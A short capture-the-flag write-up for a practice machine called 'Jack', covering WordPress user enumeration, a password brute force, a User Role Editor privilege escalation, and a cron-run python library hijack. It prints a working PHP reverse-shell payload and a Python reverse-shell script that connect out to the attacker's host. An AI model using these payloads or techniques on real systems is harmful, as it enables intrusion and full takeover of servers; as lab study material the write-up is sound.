# Jack

with wpscan enumaration found 3 users

### Exploitation
```
[+] jack
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://jack.thm/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] wendy
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] danny
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)


> wpscan --url {URL} -U names -P /fasttrack.txt

using wpscan to brute-force login found 

[+] Performing password attack on Xmlrpc against 3 user/s
[SUCCESS] - wendy / changelater 
```

### wordpress login
```
nothing interesting here, but after using exploit-db found exploit 

> searchsploit worpress privilege

WordPress Plugin User Role Editor < 4.25 - Privilege Escalation                                              | php/webapps/44595.rb


read exploit, edit wendy profile and add 'ure_other_roles'=administrator in upgrade - request

done, wendy is admin

edit puglin with reverse shell

paload : <?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} 5555 >/tmp/f");?>
```

### First access
```
hind in jack directory to see backups
in /var/backups found id_rsa

found in /opt/statuscheck stript running between 2 minuts


jack@jack:/opt/statuscheck$ cat checker.py 
import os

os.system("/usr/bin/curl -s -I http://127.0.0.1 >> /opt/statuscheck/output.log")


jack@jack:/opt/statuscheck$ ls -la /usr/lib/python2.7/os.py
-rw-rw-r-x 1 root family 25908 Nov 16  2020 /usr/lib/python2.7/os.py

jack@jack:/opt/statuscheck$ id
uid=1000(jack) gid=1000(jack) groups=1000(jack),4(adm),24(cdrom),30(dip),46(plugdev),115(lpadmin),116(sambashare),1001(family)

jack can edit /os.py

> echo 's=open("/root/root.txt").read();open("/opt/statuscheck/output.log","w").write(s)' > os.py
> cp os.py /usr/lib/python2.7/os.py

Success read root flag, but not gain privilege

```

### Privilege
```
Script:
	import pty,socket
	s= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(("10.9.9.124",6666))
	dup2(s.fileno(),0)
	dup2(s.fileno(),1)
	dup2(s.fileno(),2)
	pty.spawn("/bin/bash")


listening and get root
```
